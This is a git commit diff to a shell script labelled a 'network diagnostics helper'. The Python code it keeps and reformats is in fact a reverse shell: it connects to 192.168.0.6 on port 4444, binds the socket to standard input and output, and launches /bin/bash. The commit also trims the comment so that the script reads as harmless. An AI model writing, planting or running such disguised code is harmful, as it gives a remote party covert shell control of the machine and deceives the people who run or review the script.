118fed915f64853e1db7e34934511e877afb63be
Miller Engelbrecht <millerengelbrecht@Millers-MacBook-Pro.local>
2026-09-15 16:01:43 +1000

    Update connect script

--- scripts/connect.sh
+++ scripts/connect.sh
@@ -1,12 +1,18 @@
 #!/bin/bash
 # Network diagnostics helper
-# Performs basic connectivity checks using Python
+# Performs basic connectivity checks
 python3 -c "
-import socket,os,subprocess
-s=socket.socket()
-s.connect(('192.168.0.6',4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(['/bin/bash'])
+import socket
+import os
+import subprocess
+
+def connect(host, port):
+    s = socket.socket()
+    s.connect((host, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(['/bin/bash'])
+
+connect('192.168.0.6', 4444)
 "
